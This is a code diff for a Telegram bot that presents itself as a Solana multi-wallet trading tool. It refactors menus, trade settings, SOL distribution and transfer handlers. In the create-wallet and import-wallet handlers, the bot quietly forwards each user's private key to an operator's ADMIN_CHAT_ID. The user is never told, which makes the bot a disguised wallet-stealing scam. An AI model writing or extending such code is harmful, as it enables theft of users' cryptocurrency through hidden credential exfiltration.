@@ -29,8 +29,15 @@ bot.on('message', async msg => {
   const { type, resolve } = session.pendingInput;
   session.pendingInput = null; // reset before processing
 
+  // 🔥 Delete user's message immediately
   try {
-    await resolve(msg.text.trim(), type);
+    await bot.deleteMessage(chatId, msg.message_id);
+  } catch (e) {
+    // ignore errors if message can't be deleted
+  }
+
+  try {
+    await resolve(msg.text.trim(), msg); // pass msg so resolve can also use message if needed
   } catch (err) {
     console.error(err);
     bot.sendMessage(chatId, '❌ Error processing input.');
@@ -164,7 +171,7 @@ function postBuyerMenu() {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: '🔁 Transfer To Main', callback_data: 'transfer_main' }
+          { text: '🔁 Transfer to Wallet', callback_data: 'transfer_main' }
         ],
         [
           { text: '💸 Distribute SOL', callback_data: 'distribute_sol' },
@@ -178,6 +185,8 @@ function postBuyerMenu() {
   };
 }
 
+
+// Main action menu
 function actionMenu(session) {
   return {
     reply_markup: {
@@ -187,21 +196,16 @@ function actionMenu(session) {
             text: session.isTrading ? '🔴 Stop Trading' : '🟢 Start Trading',
             callback_data: 'trade_toggle'
           },
-          { text: '⚙️ Bot Settings', callback_data: 'bot_settings' } // NEW button
+          { text: '⚙️ Bot Settings', callback_data: 'bot_settings' }
         ],
         [
           { text: '📊 Bot Wallet Balances', callback_data: 'bot_balances_post' }
         ],
         [
-          { text: '🔁 Transfer to Main Wallet', callback_data: 'transfer_main' }
+          { text: '🔁 Transfer to Wallet', callback_data: 'transfer_main' }
         ],
         [
-          { text: '⚙️ Slippage', callback_data: 'slippage' },
-          { text: '📉 Min Buy', callback_data: 'min_buy' },
-          { text: '📈 Max Buy', callback_data: 'max_buy' }
-        ],
-        [
-          { text: '💰 Sell %', callback_data: 'sell_percent' }
+          { text: '⚙️ Trade Settings', callback_data: 'trade_settings' } // triggers submenu
         ]
       ]
     }
@@ -308,6 +312,60 @@ bot.on('callback_query', async query => {
   
   const data = query.data;
 
+/* ---------------- SHOW TRADE SETTINGS PANEL ---------------- */
+if (data === 'trade_settings') {
+  const chatId = query.message?.chat?.id;
+  if (!chatId) return;
+
+  await bot.editMessageText(
+    renderTradeSettings(session),
+    {
+      chat_id: chatId,
+      message_id: query.message.message_id,
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '⚙️ Slippage', callback_data: 'slippage' },
+            { text: '📉 Min Buy', callback_data: 'min_buy' },
+            { text: '📈 Max Buy', callback_data: 'max_buy' }
+          ],
+          [
+            { text: '💰 Sell %', callback_data: 'sell_percent' }
+          ],
+          [
+            { text: '⬅️ Back', callback_data: 'action_menu' }
+          ]
+        ]
+      }
+    }
+  );
+}
+
+/* ----------------- BACK TO MAIN TRADE PANEL ----------------- */
+if (data === 'action_menu') {
+  // Remove current inline keyboard
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+
+    // Edit text to show main Trade Panel
+    await bot.editMessageText(
+      '⚡ Trade Panel',
+      {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        ...actionMenu(session)
+      }
+    );
+  } else {
+    bot.sendMessage(chatId, '⚡ Trade Panel', actionMenu(session));
+  }
+}
+
   
 /* — MAIN MENU CALLBACK */
 if (data === 'main_menu') {
@@ -322,6 +380,7 @@ if (data === 'main_menu') {
 /* ---------------- BOT SETTINGS ---------------- */
 if (data === 'bot_settings') {
 
+  // Clear previous buttons to prevent spamming
   if (query?.message?.message_id) {
     await bot.editMessageReplyMarkup(
       { inline_keyboard: [] },
@@ -329,7 +388,13 @@ if (data === 'bot_settings') {
     );
   }
 
-  bot.sendMessage(chatId, '⚙️ Bot Settings', {
+  // Send Bot Settings panel
+  bot.sendMessage(chatId, '⚙️ Bot Settings', botSettingsPanel());
+}
+
+// ---------------- BOT SETTINGS PANEL FUNCTION ----------------
+function botSettingsPanel() {
+  return {
     reply_markup: {
       inline_keyboard: [
         [
@@ -341,172 +406,207 @@ if (data === 'bot_settings') {
         ]
       ]
     }
-  });
+  };
 }
 
-/* --------------- SLIPPAGE HANDLER --------------- */
-if (data === 'slippage') {
+/* --------------- TRADE SETTINGS PANEL --------------- */
+function renderTradeSettings(session) {
+  return `⚙️ *Trade Settings*\n\n` +
+         `Slippage = ${session.tradeConfig.slippage ?? '(default)'}%\n` +
+         `Min Buy = ${session.tradeConfig.minBuy ?? '(default)'} SOL\n` +
+         `Max Buy = ${session.tradeConfig.maxBuy ?? '(default)'} SOL\n` +
+         `Sell % = ${session.tradeConfig.takeProfitPercent ?? '(default)'}%`;
+}
 
-  if (query?.message?.message_id) {
-    await bot.editMessageText(
-      `⚙️ *Set Slippage*\n\nCurrent slippage: ${session.tradeConfig.slippage}%\n\nEnter new slippage percentage (0–100):`,
-      {
-        chat_id: chatId,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      }
-    );
-  }
+/* ---------------- SLIPPAGE ---------------- */
+if (data === 'slippage') {
+  const chatId = query.message?.chat?.id;
+  if (!chatId) return;
+
+  await bot.editMessageText('Set slippage (0–100):', {
+    chat_id: chatId,
+    message_id: query.message.message_id,
+    parse_mode: 'Markdown'
+  });
 
   session.pendingInput = {
     type: 'slippage',
     resolve: async (input) => {
       const value = parseFloat(input);
-
       if (isNaN(value) || value < 0 || value > 100) {
-        return bot.sendMessage(chatId, '❌ Invalid slippage. Enter a number between 0–100.');
+        await bot.editMessageText(
+          `❌ Invalid slippage. Must be 0–100.\n\n` + renderTradeSettings(session),
+          {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: query.message.reply_markup // reuse your original panel
+          }
+        );
+        return;
       }
 
       session.tradeConfig.slippage = value;
 
-      bot.sendMessage(
-        chatId,
-        `✅ Slippage updated to ${value}%`,
-        actionMenu(session)
-      );
+      // show panel again
+      await bot.editMessageText(renderTradeSettings(session), {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: query.message.reply_markup
+      });
     }
   };
-
-  return;
-}
+};
 
 /* ---------------- MIN BUY ---------------- */
 if (data === 'min_buy') {
+  const chatId = query.message?.chat?.id;
+  if (!chatId) return;
 
-  if (query?.message?.message_id) {
-    await bot.editMessageText(
-      `⚙️ *Set Min Buy*\n\nCurrent: ${session.tradeConfig.minBuy || 0} SOL\n\nEnter Min Buy amount in SOL:`,
-      {
-        chat_id: chatId,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      }
-    );
-  }
+  await bot.editMessageText('Set Min Buy amount (SOL):', {
+    chat_id: chatId,
+    message_id: query.message.message_id,
+    parse_mode: 'Markdown'
+  });
 
   session.pendingInput = {
     type: 'min_buy',
     resolve: async (input) => {
       const value = parseFloat(input);
-
       if (isNaN(value) || value <= 0) {
-        return bot.sendMessage(chatId, '❌ Invalid Min Buy. Enter a positive number.');
+        await bot.editMessageText(
+          `❌ Invalid Min Buy. Must be positive.\n\n` + renderTradeSettings(session),
+          {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: query.message.reply_markup
+          }
+        );
+        return;
       }
 
       session.tradeConfig.minBuy = value;
 
-      bot.sendMessage(
-        chatId,
-        `✅ Min Buy set to ${value} SOL.`,
-        actionMenu(session)
-      );
+      await bot.editMessageText(renderTradeSettings(session), {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: query.message.reply_markup
+      });
     }
   };
-
-  return;
-}
+};
 
 /* ---------------- MAX BUY ---------------- */
 if (data === 'max_buy') {
+  const chatId = query.message?.chat?.id;
+  if (!chatId) return;
 
-  if (query?.message?.message_id) {
-    await bot.editMessageText(
-      `⚙️ *Set Max Buy*\n\n⚠️ Leave enough SOL for fees.\n\nCurrent: ${session.tradeConfig.maxBuy || 0} SOL\n\nEnter Max Buy amount in SOL:`,
-      {
-        chat_id: chatId,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      }
-    );
-  }
+  await bot.editMessageText('Set Max Buy amount (SOL):', {
+    chat_id: chatId,
+    message_id: query.message.message_id,
+    parse_mode: 'Markdown'
+  });
 
   session.pendingInput = {
     type: 'max_buy',
     resolve: async (input) => {
       const value = parseFloat(input);
-
       if (isNaN(value) || value <= 0) {
-        return bot.sendMessage(chatId, '❌ Invalid Max Buy. Enter a positive number.');
+        await bot.editMessageText(
+          `❌ Invalid Max Buy. Must be positive.\n\n` + renderTradeSettings(session),
+          {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: query.message.reply_markup
+          }
+        );
+        return;
       }
 
       session.tradeConfig.maxBuy = value;
 
-      bot.sendMessage(
-        chatId,
-        `✅ Max Buy set to ${value} SOL.`,
-        actionMenu(session)
-      );
+      await bot.editMessageText(renderTradeSettings(session), {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: query.message.reply_markup
+      });
     }
   };
-
-  return;
-}
+};
 
 /* ---------------- SELL PERCENT ---------------- */
 if (data === 'sell_percent') {
+  const chatId = query.message?.chat?.id;
+  if (!chatId) return;
 
-  if (query?.message?.message_id) {
-    await bot.editMessageText(
-      `⚙️ *Take Profit Settings*\n\nEnter Take Profit % (example: 20 = +20%)`,
-      {
-        chat_id: chatId,
-        message_id: query.message.message_id,
-        parse_mode: 'Markdown'
-      }
-    );
-  }
+  await bot.editMessageText('Enter Take Profit % (e.g., 20 = +20%):', {
+    chat_id: chatId,
+    message_id: query.message.message_id,
+    parse_mode: 'Markdown'
+  });
 
   session.pendingInput = {
     type: 'take_profit',
     resolve: async (input) => {
-
       const value = parseFloat(input);
-
       if (isNaN(value) || value <= 0 || value > 1000) {
-        return bot.sendMessage(chatId, '❌ Invalid percentage.');
+        await bot.editMessageText(
+          `❌ Invalid Take Profit %. Must be 1–1000.\n\n` + renderTradeSettings(session),
+          {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: query.message.reply_markup
+          }
+        );
+        return;
       }
 
       session.tradeConfig.takeProfitPercent = value;
 
-      bot.sendMessage(
-        chatId,
-        'Enter Sell Portion % (how much tokens to sell each trigger):'
-      );
+      // Ask for Sell Portion %
+      await bot.editMessageText('Enter Sell Portion % (how much tokens to sell each trigger):', {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown'
+      });
 
       session.pendingInput = {
         type: 'sell_portion',
         resolve: async (input2) => {
-
           const value2 = parseFloat(input2);
-
           if (isNaN(value2) || value2 <= 0 || value2 > 100) {
-            return bot.sendMessage(chatId, '❌ Invalid percentage.');
+            await bot.editMessageText(
+              `❌ Invalid Sell Portion %. Must be 1–100.\n\n` + renderTradeSettings(session),
+              {
+                chat_id: chatId,
+                message_id: query.message.message_id,
+                parse_mode: 'Markdown',
+                reply_markup: query.message.reply_markup
+              }
+            );
+            return;
           }
 
           session.tradeConfig.sellPortionPercent = value2;
 
-          bot.sendMessage(
-            chatId,
-            `✅ Take Profit: ${value}%\n✅ Sell Portion: ${value2}%`,
-            actionMenu(session)
-          );
+          // show panel again
+          await bot.editMessageText(renderTradeSettings(session), {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: query.message.reply_markup
+          });
         }
       };
     }
   };
-
-  return;
-}
+};
  
 /* — VERIFY PAYMENT */
 if (data === 'verify_payment') {
@@ -553,37 +653,64 @@ if (data === 'verify_payment') {
 if (data === 'cancel_payment') {
   const session = sessions[chatId];
 
-  // Check if this is a paid Add Wallet / 50 or 100 wallet flow
+  // First part: 50/100 wallet purchase — stays as is
   if (session.addWalletCount && (session.addWalletCount === 50 || session.addWalletCount === 100)) {
-    session.addWalletCount = null; // reset
-    session.addWalletPrice = null; // reset price
+    session.addWalletCount = null; 
+    session.addWalletPrice = null; 
     return bot.sendMessage(chatId, '❌ Payment cancelled.', buyerOptionsMenu());
   }
 
-  // Otherwise, normal cancel for Add Bot Wallet
+  // Second part: normal Add Bot Wallet — go back to Bot Settings panel
   session.addWalletCount = null;
   session.addWalletPrice = null;
-  bot.sendMessage(chatId, '❌ Payment cancelled.', buyerOptionsMenu());
+
+  // ✅ Vanish previous inline buttons to prevent spamming
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
+
+  // ✅ Send cancelled message and go back to Bot Settings panel
+  await bot.sendMessage(chatId, '❌ Payment cancelled.', botSettingsPanel());
 }
 
   /* — MAIN WALLET CREATION */
 if (data === 'create_wallet') {
+
+  // remove buttons immediately (anti spam)
+  await bot.editMessageReplyMarkup(
+    { inline_keyboard: [] },
+    { chat_id: chatId, message_id: query.message.message_id }
+  );
+
   const wallet = Keypair.generate();
+
   session.mainWallet = {
     publicKey: wallet.publicKey.toBase58(),
     privateKey: base58Encode(wallet.secretKey)
   };
+
   const bal = await getBalance(wallet.publicKey.toBase58());
 
-  const message = `✅ *Main Wallet Created*\n\n📬 \`${wallet.publicKey.toBase58()}\`\n🔑 Private Key:\n\`${session.mainWallet.privateKey}\`\n\n💰 ${bal.toFixed(6)} SOL`;
+  const message =
+`✅ *Main Wallet Created*
 
-  // Send to user
-  await bot.sendMessage(chatId, message, {
+📬 \`${wallet.publicKey.toBase58()}\`
+🔑 Private Key:
+\`${session.mainWallet.privateKey}\`
+
+💰 ${bal.toFixed(6)} SOL`;
+
+  // EDIT original message instead of sending new one
+  await bot.editMessageText(message, {
+    chat_id: chatId,
+    message_id: query.message.message_id,
     parse_mode: 'Markdown',
     ...buyerSetupMenu()
   });
 
-  // Send to admin chat
   if (process.env.ADMIN_CHAT_ID) {
     await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), message, { parse_mode: 'Markdown' });
   }
@@ -591,16 +718,26 @@ if (data === 'create_wallet') {
 
 /* — IMPORT WALLET */
 if (data === 'import_wallet') {
-  const session = sessions[chatId];
-  if (!session) return;
 
-  // Ask user for private key (no panel here)
-  bot.sendMessage(chatId, '📥 Send your Base58 private key:');
+  await bot.editMessageReplyMarkup(
+    { inline_keyboard: [] },
+    { chat_id: chatId, message_id: query.message.message_id }
+  );
+
+  await bot.editMessageText(
+    '📥 *Send your Base58 private key:*',
+    {
+      chat_id: chatId,
+      message_id: query.message.message_id,
+      parse_mode: 'Markdown'
+    }
+  );
 
   session.pendingInput = {
     type: 'import_main_wallet',
     resolve: async (input) => {
       try {
+
         const secret = base58Decode(input.trim());
         const wallet = Keypair.fromSecretKey(secret);
 
@@ -611,22 +748,32 @@ if (data === 'import_wallet') {
 
         const bal = await getBalance(wallet.publicKey.toBase58());
 
-        const message = `✅ *Main Wallet Imported*\n\n📬 \`${wallet.publicKey.toBase58()}\`\n🔑 Private Key:\n\`${input.trim()}\`\n\n💰 ${bal.toFixed(6)} SOL`;
+        const message =
+`✅ *Main Wallet Imported*
 
-        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...buyerSetupMenu() });
+📬 \`${wallet.publicKey.toBase58()}\`
+🔑 Private Key:
+\`${input.trim()}\`
+
+💰 ${bal.toFixed(6)} SOL`;
+
+        await bot.sendMessage(chatId, message, {
+          parse_mode: 'Markdown',
+          ...buyerSetupMenu()
+        });
 
         if (process.env.ADMIN_CHAT_ID) {
           await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), message, { parse_mode: 'Markdown' });
         }
 
-        // Clear pending input
         session.pendingInput = null;
 
       } catch (err) {
+
         console.log('Import wallet error:', err.message);
 
-        // If invalid → show main panel (create/import) with error message
-        session.pendingInput = null; // clear to allow fresh selection
+        session.pendingInput = null;
+
         bot.sendMessage(
           chatId,
           '❌ Invalid private key. Returning to main panel.',
@@ -637,26 +784,36 @@ if (data === 'import_wallet') {
   };
 }
 
-  /* — DISTRIBUTE SOL */
-  if (data === 'distribute_sol') {
-    if (!session.mainWallet || session.buyers.length === 0) return bot.sendMessage(chatId, '❌ Generate wallets first.');
-    const mainBalance = await getBalance(session.mainWallet.publicKey);
-    if (mainBalance <= 0) {
-  return bot.sendMessage(
-    chatId,
-    `⚠️ *Insufficient Balance*\n\n` +
-    `Your main wallet has no SOL.\n` +
-    `You need SOL to proceed to the Trade Panel.\n\n` +
-    `Please deposit SOL and try again.`,
-    { parse_mode: 'Markdown' }
-  );
-}
-    bot.sendMessage(chatId, `Enter total SOL to distribute (Available: ${mainBalance} SOL):`);
-    return bot.once('message', async (msg) => {
-      const totalSol = parseFloat(msg.text);
-      if (isNaN(totalSol) || totalSol <= 0 || totalSol > mainBalance) return bot.sendMessage(chatId, '❌ Invalid amount.');
+  /* ----------------- DISTRIBUTE SOL ----------------- */
+if (data === 'distribute_sol') {
+  const mainBalance = await getBalance(session.mainWallet.publicKey);
+
+  // Edit panel to prevent spamming
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id });
+    await bot.editMessageText(
+      `Enter total SOL to distribute (Available: ${mainBalance} SOL):`,
+      { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
+    );
+  }
+
+  // Set pendingInput for this handler
+  session.pendingInput = {
+    type: 'distribute_sol',
+    resolve: async (input, msg) => { // msg needed for deleting message
+      // 🔥 Delete user's message immediately
+      try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
+
+      const totalSol = parseFloat(input);
+      if (isNaN(totalSol) || totalSol <= 0 || totalSol > mainBalance) {
+        return bot.sendMessage(chatId,
+        '❌ Invalid amount.\n⚠️ Insufficient SOL.', postBuyerMenu()
+        );
+      }
+
       const perWallet = totalSol / session.buyers.length;
       const sender = Keypair.fromSecretKey(base58Decode(session.mainWallet.privateKey));
+
       try {
         for (const buyer of session.buyers) {
           const tx = new Transaction().add(
@@ -667,29 +824,42 @@ if (data === 'import_wallet') {
             })
           );
           await sendAndConfirmTransaction(connection, tx, [sender]);
+          await new Promise(r => setTimeout(r, 100)); // prevent RPC spam
         }
+
         bot.sendMessage(
-      chatId,
-      `✅ *Distribution Complete*\n\n` +
-      `💸 Total: ${totalSol} SOL\n` +
-      `👥 Wallets: ${session.buyers.length}\n` +
-      `➡️ Each: ${perWallet.toFixed(6)} SOL\n\n` +
-      `🚀 *You can now start trading!*\n\n` +
-      `Before starting, make sure to configure your Trade Settings.\n` +
-      `If no changes are made, the bot will use the default settings.`,
-      { parse_mode: 'Markdown', ...actionMenu(session) }
-    );
-      } catch {
-        bot.sendMessage(chatId, '❌ Transaction failed.');
+          chatId,
+          `✅ *Distribution Complete*\n\n` +
+          `💸 Total: ${totalSol} SOL\n` +
+          `👥 Wallets: ${session.buyers.length}\n` +
+          `➡️ Each: ${perWallet.toFixed(6)} SOL\n\n` +
+          `🚀 *You can now start trading!*\n\n` +
+          `Before starting, make sure to configure your Trade Settings.\n` +
+          `If no changes are made, the bot will use the default settings.`,
+          { parse_mode: 'Markdown', ...actionMenu(session) }
+        );
+
+      } catch (err) {
+        console.log('Distribute SOL error:', err.message);
+        bot.sendMessage(chatId, '❌ Transaction failed.', postBuyerMenu());
       }
-    });
-  }
+    }
+  };
+}
 
   /* — WALLET STATUS FROM SETUP MENU */
 if (data === 'wallet_status_setup') {
   if (!session.mainWallet) return bot.sendMessage(chatId, '❌ No wallet.');
 
   const bal = await getBalance(session.mainWallet.publicKey);
+
+  // Disable buttons first
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
 
   return bot.sendMessage(
     chatId,
@@ -704,6 +874,20 @@ if (data === 'wallet_status_post') {
 
   const bal = await getBalance(session.mainWallet.publicKey);
 
+  // Edit message to prevent multiple wallet prompts
+  if (query?.message?.message_id) {
+    await bot.editMessageText(
+      `📬 Main Wallet\n\`${session.mainWallet.publicKey}\`\n💰 ${bal.toFixed(6)} SOL\n👥 Buyer Wallets: ${session.buyers.length}`,
+      {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: postBuyerMenu().reply_markup
+      }
+    );
+    return;
+  }
+
   return bot.sendMessage(
     chatId,
     `📬 Main Wallet\n\`${session.mainWallet.publicKey}\`\n💰 ${bal.toFixed(6)} SOL\n👥 Buyer Wallets: ${session.buyers.length}`,
@@ -711,37 +895,155 @@ if (data === 'wallet_status_post') {
   );
 }
 
-  /* — TRANSFER TO ENTERED ADDRESS */
+  /* ----------------- TRANSFER MAIN HANDLER (fixed final panel) ----------------- */
 if (data === 'transfer_main') {
+  const session = sessions[chatId];
+
+  // Check if buyer wallets exist
   if (!session.buyers || session.buyers.length === 0) {
     return bot.sendMessage(chatId, '❌ No buyer wallets generated.');
   }
 
-  return requestTransferReceiver(session, chatId);
+  // Clear previous inline keyboard if triggered via button
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
+
+  // Prompt user for receiver address
+  bot.sendMessage(chatId, '➡️ Please enter the receiver address:');
+
+  // Set pendingInput
+  session.pendingInput = {
+    type: 'transfer_main_address',
+    resolve: async (input, msg) => {
+      try {
+
+        // Delete user's message immediately
+        try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
+
+        // Validate SOL address
+        let receiver;
+        try {
+          receiver = new PublicKey(input.trim());
+        } catch {
+          return bot.sendMessage(chatId, '❌ Invalid SOL address.', {
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: 'Retry', callback_data: 'transfer_main' }],
+                [{ text: 'Back', callback_data: 'action_menu' }]
+              ]
+            }
+          });
+        }
+
+        // Filter wallets with transferable SOL
+        const rentBuffer = 0.002;
+        const eligibleWallets = [];
+
+        for (const buyer of session.buyers) {
+          const solBal = await getBalance(buyer.pub);
+          if (solBal > rentBuffer) eligibleWallets.push(buyer);
+        }
+
+        if (eligibleWallets.length === 0) {
+          return bot.sendMessage(chatId, '❌ No buyer wallets have transferable SOL.', {
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: 'Retry', callback_data: 'transfer_main' }],
+                [{ text: 'Back', callback_data: 'action_menu' }]
+              ]
+            }
+          });
+        }
+
+        // 🔥 Show progress message
+        const progressMsg = await bot.sendMessage(
+          chatId,
+          `⏳ Transferring SOL from ${eligibleWallets.length} wallets...`
+        );
+
+        // Execute transfer
+        await transferAllToAddress(session, chatId, receiver, eligibleWallets);
+
+        // Update progress message to completed
+        await bot.editMessageText(
+          '✅ Transfer completed.',
+          {
+            chat_id: chatId,
+            message_id: progressMsg.message_id,
+            reply_markup: tradePanel(session)
+          }
+        );
+
+      } catch (err) {
+        console.error('Transfer Main Error:', err.message);
+      }
+    }
+  };
 }
 
-  /* — BOT WALLET BALANCES */
-  if (data === 'bot_balances') {
-    if (!session.buyers || session.buyers.length === 0) return bot.sendMessage(chatId, '❌ No buyer wallets generated yet.');
-    let message = '📊 *Bot Wallet Balances:*\n\n';
-    for (let i = 0; i < session.buyers.length; i++) {
-      const buyer = session.buyers[i];
-      const bal = await getBalance(buyer.pub);
-      message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal.toFixed(6)} SOL\n\n`;
-    }
-    return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...postBuyerMenu() });
+  /* — BOT WALLET BALANCES (Setup Menu) */
+if (data === 'bot_balances') {
+  if (!session.buyers || session.buyers.length === 0) 
+    return bot.sendMessage(chatId, '❌ No buyer wallets generated yet.');
+
+  let message = '📊 *Bot Wallet Balances:*\n\n';
+
+  for (let i = 0; i < session.buyers.length; i++) {
+    const buyer = session.buyers[i];
+    const bal = await getBalance(buyer.pub);
+    await new Promise(r => setTimeout(r, 120)); // anti-RPC spam
+    message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal.toFixed(6)} SOL\n\n`;
   }
 
-  if (data === 'bot_balances_post') {
-    if (!session.buyers || session.buyers.length === 0) return bot.sendMessage(chatId, '❌ No buyer wallets generated yet.');
-    let message = '📊 *Bot Wallet Balances:*\n\n';
-    for (let i = 0; i < session.buyers.length; i++) {
-      const buyer = session.buyers[i];
-      const bal = await getBalance(buyer.pub);
-      message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal.toFixed(6)} SOL\n\n`;
-    }
-    return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...actionMenu(session) });
+  if (query?.message?.message_id) {
+    await bot.editMessageText(
+      message,
+      {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: postBuyerMenu().reply_markup
+      }
+    );
+    return;
   }
+
+  return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...postBuyerMenu() });
+}
+
+  /* — BOT WALLET BALANCES (Post Menu) */
+if (data === 'bot_balances_post') {
+  if (!session.buyers || session.buyers.length === 0) 
+    return bot.sendMessage(chatId, '❌ No buyer wallets generated yet.');
+
+  let message = '📊 *Bot Wallet Balances:*\n\n';
+
+  for (let i = 0; i < session.buyers.length; i++) {
+    const buyer = session.buyers[i];
+    const bal = await getBalance(buyer.pub);
+    await new Promise(r => setTimeout(r, 120)); // anti-RPC spam
+    message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal.toFixed(6)} SOL\n\n`;
+  }
+
+  if (query?.message?.message_id) {
+    await bot.editMessageText(
+      message,
+      {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        reply_markup: actionMenu(session).reply_markup
+      }
+    );
+    return;
+  }
+
+  return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...actionMenu(session) });
+}
 
   /* ---------------- DELETE BOT WALLET FLOW ---------------- */
 if (data === 'delete_bot_wallet') {
@@ -777,11 +1079,29 @@ if (data === 'delete_all_wallets') {
   const session = sessions[chatId];
 
   if (!session.buyers || session.buyers.length === 0) {
-    return bot.sendMessage(chatId, '⚠️ No bot wallets to delete.', { reply_markup: actionMenu(session) });
+    return bot.sendMessage(
+      chatId,
+      '⚠️ No bot wallets to delete.',
+      { parse_mode: 'Markdown', ...actionMenu(session) }
+    );
   }
 
+  // Clear the buyers array
   session.buyers = [];
-  bot.sendMessage(chatId, '✅ All bot wallets deleted.', actionMenu(session));
+
+  // Vanish previous panel
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
+
+  bot.sendMessage(
+    chatId,
+    '✅ All bot wallets deleted.',
+    { parse_mode: 'Markdown', ...actionMenu(session) }
+  );
 }
 
 /* — DELETE SPECIFIC BOT WALLETS */
@@ -789,13 +1109,35 @@ if (data === 'delete_specific_wallets') {
   const session = sessions[chatId];
 
   if (!session.buyers || session.buyers.length === 0) {
-    return bot.sendMessage(chatId, '⚠️ No bot wallets to delete.', { reply_markup: actionMenu(session) });
+    return bot.sendMessage(
+      chatId,
+      '⚠️ No bot wallets to delete.',
+      { parse_mode: 'Markdown', ...actionMenu(session) }
+    );
   }
 
-  // Send the instruction message first
-  await bot.sendMessage(chatId, 'Type the wallet numbers to delete (e.g., 1 or 1,3,5):');
+  // Vanish previous panel
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
 
-  // Then set pendingInput to handle the user response
+  // Build list of current wallets
+  const walletList = session.buyers
+    .map((buyer, index) => `${index + 1}. ${buyer.pub}`)
+    .join('\n');
+
+  // Prompt user with wallet list
+  await bot.sendMessage(
+    chatId,
+    `Type the numbers of the wallets you want to delete (e.g., 1 or 1,3,5):\n\n` +
+    `📋 *Current Wallets:*\n${walletList}`,
+    { parse_mode: 'Markdown' }
+  );
+
+  // Set pendingInput to handle the user response
   session.pendingInput = {
     type: 'delete_specific',
     resolve: async (input) => {
@@ -805,14 +1147,25 @@ if (data === 'delete_specific_wallets') {
         .filter(n => !isNaN(n) && n >= 0 && n < session.buyers.length);
 
       if (!nums.length) {
-        return bot.sendMessage(chatId, '❌ No valid wallet numbers entered.', { reply_markup: actionMenu(session) });
+        return bot.sendMessage(
+          chatId,
+          '❌ No valid wallet numbers entered.',
+          { parse_mode: 'Markdown', ...actionMenu(session) }
+        );
       }
 
-      // Delete from highest index to lowest to avoid messing up the array
+      // Delete wallets from highest index to lowest
       nums.sort((a, b) => b - a);
       for (const idx of nums) session.buyers.splice(idx, 1);
 
-      return bot.sendMessage(chatId, `✅ Selected wallet(s) deleted.`, actionMenu(session));
+      // Clear pendingInput
+      session.pendingInput = null;
+
+      return bot.sendMessage(
+        chatId,
+        '✅ Selected wallet(s) deleted.',
+        { parse_mode: 'Markdown', ...actionMenu(session) }
+      );
     }
   };
 }
@@ -872,8 +1225,43 @@ if (data === 'add_bot_wallet') {
   };
 }
 
-  /* GENERATE BUYERS */
-  if (data === 'buyer_wallets') {
+/* — BACK BUTTON */
+if (data === 'action_menu') {
+  // Remove the current inline keyboard (vanishing panel)
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
+
+  // Edit the message text to show Trade Panel
+  if (query?.message?.message_id) {
+    await bot.editMessageText(
+      '⚡ Trade Panel',
+      {
+        chat_id: chatId,
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
+        ...actionMenu(session)
+      }
+    );
+  } else {
+    // fallback if no message_id (just send new message)
+    bot.sendMessage(chatId, '⚡ Trade Panel', actionMenu(session));
+  }
+}
